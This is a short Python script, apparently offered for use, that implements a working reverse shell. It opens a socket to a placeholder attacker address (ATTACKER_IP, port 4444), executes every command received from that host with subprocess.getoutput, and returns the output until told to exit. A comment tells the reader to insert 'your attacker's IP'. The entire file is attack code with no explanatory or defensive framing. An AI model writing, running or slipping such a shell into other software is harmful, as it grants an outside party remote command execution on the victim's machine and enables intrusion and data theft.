import socket
import subprocess
import os

# Replace with your attacker's IP and port
ATTACKER_IP = "192.168.1.10"
ATTACKER_PORT = 4444

def connect():
    try:
        # Create a socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Redirect output to the attacker's machine
        while True:
            # Receive command from attacker
            command = sock.recv(1024).decode("utf-8")
            
            if command.lower() == "exit":
                break
            
            # Execute the command
            output = subprocess.getoutput(command)
            
            # Send back the output
            sock.send(output.encode("utf-8"))
        
        sock.close()
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    connect()
